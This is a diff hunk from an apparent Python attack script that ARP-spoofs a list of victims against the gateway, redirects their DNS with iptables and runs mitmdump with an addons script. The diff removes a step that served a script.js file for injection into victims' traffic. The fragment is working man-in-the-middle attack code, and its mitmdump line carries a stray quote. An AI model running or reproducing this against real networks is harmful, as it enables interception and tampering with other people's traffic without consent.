@@ -23,9 +23,6 @@ os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port
 for victim in victims:
     os.system("xterm -e arpspoof -i eth0 -t " + victim + " " + gateway + " &")
     os.system("xterm -e arpspoof -i eth0 -t " + gateway + " " + victim + " &")
-	
-# start the http server for serving the script.js, in a new console
-os.system("xterm -hold -e 'python3 httpServer.py' &")
 
 # start the mitmproxy
 os.system("mitmdump -s addons.py' -T")
